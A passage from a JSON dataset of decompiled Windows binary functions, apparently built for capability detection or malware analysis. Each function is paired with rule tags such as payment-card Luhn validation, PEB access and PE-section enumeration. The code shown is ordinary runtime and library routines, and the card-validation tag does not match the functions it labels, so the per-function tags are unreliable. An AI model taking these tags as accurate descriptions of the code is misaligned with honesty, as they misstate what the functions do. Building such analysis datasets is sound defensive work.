        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040eb80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint arg_8h_00;\n    uint pimldp;\n    uint var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint hgdiobj;\n    int32_t var_3ch;\n    uint hdc;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_3ch = arg_8h;\n    hdc = (*_sym.imp.USER32.dll_GetDC)(0);\n    iVar4 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(hdc);\n    arg_8h_00 = 7;\n    hgdiobj = (*_sym.imp.GDI32.dll_GetCurrentObject)(iVar4);\n    var_34h = 0;\n    if (0 < arg_ch) {\n        do {\n            iVar5 = var_34h;\n            var_2ch = *(in_ECX + 0x90);\n            var_28h = *(in_ECX + 0x94);\n            var_8h = 0;\n            var_30h = 0x28;\n            var_24h = 0x200001;\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = 0;\n            var_10h = 0;\n            var_ch = 0;\n            var_48h = (*_sym.imp.GDI32.dll_CreateDIBSection)(hdc, &var_30h, 0, 0, 0, 0);\n            if (var_48h != 0) {\n                (*_sym.imp.GDI32.dll_SelectObject)(iVar4, var_48h);\n                var_88h = *(in_ECX + 0x48);\n                var_84h = var_3ch + iVar5;\n                _var_64h = 0;\n                var_58h = 0;\n                var_4ch = 0;\n                pimldp = 0x44;\n                _var_7ch = ZEXT816(0);\n                var_6ch = 0;\n                var_68h = 0;\n                var_5ch = 1;\n                var_54h = 8;\n                var_50h = 0xff;\n                var_80h = iVar4;\n                (*_sym.imp.COMCTL32.dll_ImageList_DrawIndirect)(&pimldp);\n            }\n            (*_sym.imp.GDI32.dll_SelectObject)(iVar4, hgdiobj);\n            iVar5 = *(in_ECX + 0xbc);\n            if (*(in_ECX + 0xb8) == iVar5) {\n                puVar6 = *(in_ECX + 0xb4);\n                if ((puVar6 <= &var_44h) && (puVar1 = puVar6 + iVar5,  puVar6 = *(in_ECX + 0xb4),  &var_44h < puVar1)) {\n                    fcn.00402f30(0x80004005);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                if (iVar5 == 0) {\n                    uVar7 = 1;\ncode_r0x0040ed00:\n                    iVar5 = fcn.0043bd7a(puVar6, uVar7, 4);\n                    if (iVar5 != 0) {\n                        *(in_ECX + 0xbc) = uVar7;\n                        *(in_ECX + 0xb4) = iVar5;\n                        goto code_r0x0040ed1c;\n                    }\n                }\n                else {\n                    uVar7 = *(in_ECX + 0xb8) * 2;\n                    if ((-1 < uVar7) && (uVar7 < 0x20000000)) goto code_r0x0040ed00;\n                }\n            }\n            else {\ncode_r0x0040ed1c:\n                piVar2 = *(in_ECX + 0xb4) + *(in_ECX + 0xb8) * 4;\n                if (piVar2 != NULL) {\n                    *piVar2 = var_48h;\n                }\n                *(in_ECX + 0xb8) = *(in_ECX + 0xb8) + 1;\n            }\n            var_34h = var_34h + 1;\n        } while (var_34h < arg_ch);\n    }\n    if (iVar4 != 0) {\n        (*_sym.imp.GDI32.dll_DeleteDC)(iVar4);\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, hdc);\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 1304
    },
    "0040f0d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f0d0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    \n    if (arg_14h == 0) {\n        fcn.00402c90(0);\n        return;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n        fcn.00402c90(0x16);\n        return;\n    }\n    if ((arg_10h != 0) && (arg_14h <= arg_ch)) {\n        fcn.004312b0(arg_8h, arg_10h, arg_14h);\n        fcn.00402c90(0);\n        return;\n    }\n    fcn.00431db0(arg_8h, 0, arg_ch);\n    if (arg_10h == 0) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n    }\n    else if (arg_ch < arg_14h) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x22;\n        fcn.0043bb3e();\n        fcn.00402c90(0x22);\n        return;\n    }\n    fcn.00402c90(0x16);\n    return;\n}\n",
        "token_count": 357
    },
    "0042ef32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ef32(int32_t param_1)\n\n{\n    fcn.00431db0(param_1 + 0x14, 0, 0x18);\n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x34) = 0;\n    return param_1;\n}\n",
        "token_count": 99
    },
    "0042efb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042efb5(uint *arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *in_ECX;\n    uint32_t uVar5;\n    \n    uVar5 = in_ECX[2];\n    if (in_ECX[1] == uVar5) {\n        puVar1 = *in_ECX;\n        if ((puVar1 <= arg_8h) && (arg_8h < puVar1 + uVar5)) {\n            fcn.00402f30(0x80004005);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        if (uVar5 == 0) {\n            uVar5 = 1;\ncode_r0x0042efec:\n            uVar3 = fcn.0043bd7a(puVar1, uVar5, 4);\n            if (uVar3 != 0) {\n                in_ECX[2] = uVar5;\n                *in_ECX = uVar3;\n                goto code_r0x0042f001;\n            }\n        }\n        else {\n            uVar5 = in_ECX[1] * 2;\n            if ((-1 < uVar5) && (uVar5 < 0x20000000)) goto code_r0x0042efec;\n        }\n        uVar4 = 0;\n    }\n    else {\ncode_r0x0042f001:\n        puVar1 = *in_ECX + in_ECX[1] * 4;\n        if (puVar1 != NULL) {\n            *puVar1 = *arg_8h;\n        }\n        in_ECX[1] = in_ECX[1] + 1;\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 428
    },
    "0042f0a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0042f0a9(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    iVar1 = fcn.0040ed80(param_1, 0, 0);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (0 < uVar2) {\n            uVar2 = uVar2 & 0xffff | 0x80070000;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 133
    },
    "0042f128": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f128(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    int32_t arg_ch;\n    \n    if ((arg_8h < 0) || (iVar1 = in_ECX[1],  iVar1 <= arg_8h)) {\n        uVar2 = 0;\n    }\n    else {\n        if (arg_8h != iVar1 + -1) {\n            arg_ch = (iVar1 - arg_8h) * 4;\n            iVar1 = *in_ECX + arg_8h * 4;\n            fcn.0042f1f2(iVar1, arg_ch, iVar1 + 4, arg_ch + -4);\n        }\n        in_ECX[1] = in_ECX[1] + -1;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 210
    },
    "0042f6e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.0042f6e2(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0xc);\n    if (iVar1 == 0) {\n        *0x6cc814 = 1;\n        return 1;\n    }\n    piVar4 = *(in_FS_OFFSET + 0x30) + 0x34;\n    iVar1 = *piVar4;\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        (*_sym.imp.KERNEL32.dll_InitializeSListHead)(iVar1);\n        iVar3 = 0;\n        LOCK();\n        if (*piVar4 == 0) {\n            *piVar4 = iVar1;\n        }\n        else {\n            iVar3 = *piVar4;\n        }\n        if (iVar3 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        iVar1 = *piVar4;\n    }\n    *0x6cc814 = iVar1;\n    return 1;\n}\n",
        "token_count": 342
    },
    "0042fb7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042fb7a(int16_t *arg_8h)\n\n{\n    if (((arg_8h != NULL) && (*arg_8h == 0x5a4d)) && (*(*(arg_8h + 0x1e) + arg_8h) == 0x4550)) {\n        return CONCAT31(1, *(*(arg_8h + 0x1e) + arg_8h + 6) == 0x10b);\n    }\n    return arg_8h & 0xffffff00;\n}\n",
        "token_count": 128
    },
    "00432b1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00432b1f(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint *arg_8h_00;\n    char cVar1;\n    char *arg_10h;\n    uint *arg_8h_01;\n    char *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = *arg_8h;\n    if (puVar4 == NULL) {\n        puVar4 = NULL;\n        arg_10h = fcn.0043ae98(0, arg_8h + 5, 0, fcn.004329a0, 0x4329a9, 0x2800);\n        if (arg_10h != NULL) {\n            pcVar2 = arg_10h;\n            do {\n                cVar1 = *pcVar2;\n                pcVar2 = pcVar2 + 1;\n            } while (cVar1 != '\\0');\n            iVar3 = pcVar2 - (arg_10h + 1);\n            if (iVar3 != 0) {\n                pcVar2 = arg_10h + iVar3 + -1;\n                do {\n                    if (*pcVar2 != ' ') break;\n                    *pcVar2 = '\\0';\n                    pcVar2 = pcVar2 + -1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            arg_8h_01 = fcn.0043bd6f(iVar3 + 5);\n            if (arg_8h_01 != NULL) {\n                arg_8h_00 = arg_8h_01 + 1;\n                *arg_8h_01 = 0;\n                fcn.0045acc6(arg_8h_00, iVar3 + 1, arg_10h);\n                puVar4 = NULL;\n                LOCK();\n                if (*arg_8h == 0) {\n                    *arg_8h = arg_8h_00;\n                }\n                else {\n                    puVar4 = *arg_8h;\n                }\n                if (puVar4 == NULL) {\n                    (*_sym.imp.KERNEL32.dll_InterlockedPushEntrySList)(arg_ch, arg_8h_01);\n                    puVar4 = arg_8h_00;\n                    arg_8h_01 = NULL;\n                }\n            }\n            fcn.0043bd54(arg_8h_01);\n        }\n        fcn.0043bd54(arg_10h);\n    }\n    return puVar4;\n}\n",
        "token_count": 583
    },
    "00432e1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432e1f(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x6ccbf4);\n    return;\n}\n",
        "token_count": 51
    },
    "00432e63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432e63(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x6ccbf4);\n    return;\n}\n",
        "token_count": 51
    },
    "00433add": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl\nfcn.00433add(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0x3c;\n    fcn.00430e10();\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x40) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x30) = *(arg_8h_00 + -4);\n    iVar3 = *(unaff_EBP + 8);\n    uVar1 = fcn.004327d0(unaff_EBP + -0x4c, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x34) = uVar1;\n    iVar2 = fcn.00432cbe();\n    *(unaff_EBP + -0x38) = *(iVar2 + 0x10);\n    iVar2 = fcn.00432cbe();\n    *(unaff_EBP + -0x3c) = *(iVar2 + 0x14);\n    iVar2 = fcn.00432cbe();\n    *(iVar2 + 0x10) = iVar3;\n    iVar3 = fcn.00432cbe();\n    *(iVar3 + 0x14) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x44) = 1;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.004325c9(arg_8h_00, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), *(unaff_EBP + 0x20));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    *(unaff_EBP + -0x44) = 0;\n    fcn.00433c30(0x4866c0, arg_ch_00);\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 720
    },
    "00433e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00433e40(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == NULL) {\n        fcn.0045ad41();\n        pcVar3 = swi(3);\n        uVar6 = (*pcVar3)();\n        return uVar6;\n    }\n    iVar7 = *arg_ch;\n    uVar6 = 0;\n    if (0 < iVar7) {\n        var_4h = 0;\n        arg_10h = *(arg_8h + 0x1c);\n        piVar5 = *(arg_10h + 0xc);\n        iVar1 = *piVar5;\n        in_EAX = piVar5 + 1;\n        do {\n            if (0 < iVar1) {\n                iVar2 = arg_ch[1];\n                piVar5 = in_EAX;\n                var_8h = iVar1;\n                do {\n                    iVar4 = fcn.004337ea(iVar2 + var_4h, *piVar5, arg_10h);\n                    if (iVar4 != 0) {\n                        uVar6 = 1;\n                        break;\n                    }\n                    var_8h = var_8h + -1;\n                    piVar5 = piVar5 + 1;\n                } while (0 < var_8h);\n            }\n            var_4h = var_4h + 0x10;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n    }\n    return in_EAX & 0xffffff00 | uVar6;\n}\n",
        "token_count": 472
    },
    "00434438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00434438(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    float in_stack_00000008;\n    uint var_4h;\n    \n    iVar1 = fcn.0043af87(0, 0, 0x47daa0, SUB84(in_stack_00000008, 0));\n    arg_8h_00 = fcn.00437f77(iVar1 + 1);\n    fcn.0043afa1(arg_8h_00, iVar1 + 1, 0x47daa0, SUB84(in_stack_00000008, 0));\n    fcn.0043406a(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 173
    },
    "00434498": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00434498(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint in_stack_00000008;\n    uint var_4h;\n    \n    iVar1 = fcn.0043af87(0, 0, 0x47daa0, in_stack_00000008);\n    arg_8h_00 = fcn.00437f77(iVar1 + 1);\n    fcn.0043afa1(arg_8h_00, iVar1 + 1, 0x47daa0, in_stack_00000008);\n    fcn.0043406a(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 163
    },
    "00438055": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00438055(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = **0x6ccc1c;\n    if (cVar1 != '\\0') {\n        if (('/' < cVar1) && (cVar1 < ':')) {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            return cVar1 + -0x2f;\n        }\n        iVar2 = 0;\n        while( true ) {\n            if (cVar1 == '@') {\n                *0x6ccc1c = *0x6ccc1c + 1;\n                return iVar2;\n            }\n            if (cVar1 == '\\0') break;\n            if (0xf < cVar1 + 0xbfU) {\n                return -1;\n            }\n            iVar2 = iVar2 * 0x10 + -0x41 + cVar1;\n            *0x6ccc1c = *0x6ccc1c + 1;\n            cVar1 = **0x6ccc1c;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 253
    },
    "004394b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004394b9(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    piVar2 = fcn.0043a99f(&var_8h, 1, 0);\n    iVar3 = *piVar2;\n    *arg_8h = iVar3;\n    iVar1 = piVar2[1];\n    arg_8h[1] = iVar1;\n    if (((iVar1 == '\\0') && (**0x6ccc1c != '\\0')) && (**0x6ccc1c != '@')) {\n        var_8h = 0x47da2c;\n        var_4h = 2;\n        fcn.004390fb(&var_10h);\n        fcn.004349e7(&var_18h, &var_8h);\n        piVar2 = fcn.00434a09(&var_20h, arg_8h);\n        iVar3 = *piVar2;\n        *arg_8h = iVar3;\n        arg_8h[1] = piVar2[1];\n    }\n    if (**0x6ccc1c == '@') {\n        *0x6ccc1c = *0x6ccc1c + 1;\n    }\n    else if (**0x6ccc1c == '\\0') {\n        if (iVar3 == 0) {\n            fcn.00434903(1);\n        }\n        else {\n            var_8h = 0x47da2c;\n            var_4h = 2;\n            fcn.00434635(1);\n            fcn.004349e7(&var_18h, &var_8h);\n            piVar2 = fcn.00434a09(&var_10h, arg_8h);\n            *arg_8h = *piVar2;\n            arg_8h[1] = piVar2[1];\n        }\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 550
    },
    "0043a653": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a653(uint *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    cVar1 = **0x6ccc1c;\n    while (cVar1 != '\\0') {\n        if (cVar1 == '@') {\n            puVar5 = fcn.00434430(&var_ch);\n            uVar2 = puVar5[1];\n            *arg_8h = *puVar5;\n            arg_8h[1] = uVar2;\n            *(arg_8h + 2) = 1;\n            return;\n        }\n        if (0xf < cVar1 + 0xbfU) break;\n        uVar4 = cVar1 - 0x41;\n        uVar3 = var_ch >> 0x1c;\n        uVar6 = var_ch * 0x10;\n        var_ch = uVar4 + uVar6;\n        var_8h = (uVar4 >> 0x1f) + (var_8h << 4 | uVar3) + CARRY4(uVar4, uVar6);\n        *0x6ccc1c = *0x6ccc1c + 1;\n        var_4h = var_8h;\n        cVar1 = **0x6ccc1c;\n    }\n    *(arg_8h + 2) = 0;\n    return;\n}\n",
        "token_count": 385
    },
    "0043af5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043af5a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.0040f1a0();\n    iVar2 = fcn.00456027(*puVar1, puVar1[1], arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 142
    },
    "0043afa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043afa1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0043af5a(arg_8h, arg_ch, arg_10h, 0, &arg_14h);\n    return;\n}\n",
        "token_count": 69
    },
    "0043b1a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043b1a9(int32_t arg_8h, uint lpProcName, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = arg_8h * 4 + 0x6ccc58;\n    iVar3 = *piVar1;\n    if (iVar3 == -1) {\n        iVar3 = 0;\n    }\n    else if (iVar3 == 0) {\n        for (; arg_10h != arg_14h; arg_10h = arg_10h + 1) {\n            iVar3 = *arg_10h;\n            iVar4 = *(iVar3 * 4 + 0x6ccc4c);\n            if (iVar4 == 0) {\n                iVar4 = fcn.0043b2fd(*(iVar3 * 4 + 0x47e010));\n                piVar2 = iVar3 * 4 + 0x6ccc4c;\n                if (iVar4 != 0) {\n                    iVar3 = *piVar2;\n                    *piVar2 = iVar4;\n                    if (iVar3 != 0) {\n                        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar4);\n                    }\n                    goto code_r0x0043b232;\n                }\n                *piVar2 = -1;\n            }\n            else if (iVar4 != -1) {\ncode_r0x0043b232:\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, lpProcName);\n                if (iVar3 != 0) {\n                    *piVar1 = iVar3;\n                    return iVar3;\n                }\n                break;\n            }\n        }\n        *piVar1 = -1;\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 442
    },
    "0043ba8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ba8a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    fcn.0043bac1(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h);\n    fcn.0043b78b();\n    return;\n}\n",
        "token_count": 111
    },
    "0043bd85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043bd85(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.0045d218(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.0045d24b(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.00431db0(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 252
    },
    "0043c5e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c5e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.0043ff96(&stack0xffffffe8, arg_ch, arg_10h);\n    fcn.0043ffcc(arg_8h, arg_ch_00, arg_10h_00, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 131
    },
    "0043c60b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c60b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.0043ffb1(&stack0xffffffe8, arg_ch, arg_10h);\n    fcn.004401db(arg_8h, arg_ch_00, arg_10h_00, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 129
    },
    "0044087a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044087a(char *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    fcn.0045f5ff(*arg_8h, *arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "00440898": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440898(uint16_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    fcn.0045f2ee(*arg_8h, *arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00447432": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447432(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_14h;\n    uint var_acch;\n    uint var_ac8h;\n    uint32_t var_ac4h;\n    uint var_ac0h;\n    uint var_abch;\n    uint var_ab8h;\n    uint var_ab4h;\n    uint var_a78h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.0045f756(arg_8h);\n    var_ac4h = var_ac4h & 0xffffff00 | uVar1;\n    var_ab8h = *param_1[4];\n    var_abch = *param_1[3];\n    var_acch = *param_1[2];\n    var_ac8h = param_1[2][1];\n    var_ac0h = **param_1;\n    arg_14h = param_1[1];\n    fcn.0043c116(&var_ac0h, &var_acch, &var_abch, arg_14h, &var_ab8h);\n    fcn.00449fed();\n    fcn.004473c0();\n    fcn.0045f801(var_ac4h, arg_8h, arg_10h);\n    fcn.004303e9(arg_14h);\n    return;\n}\n",
        "token_count": 357
    },
    "00447512": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
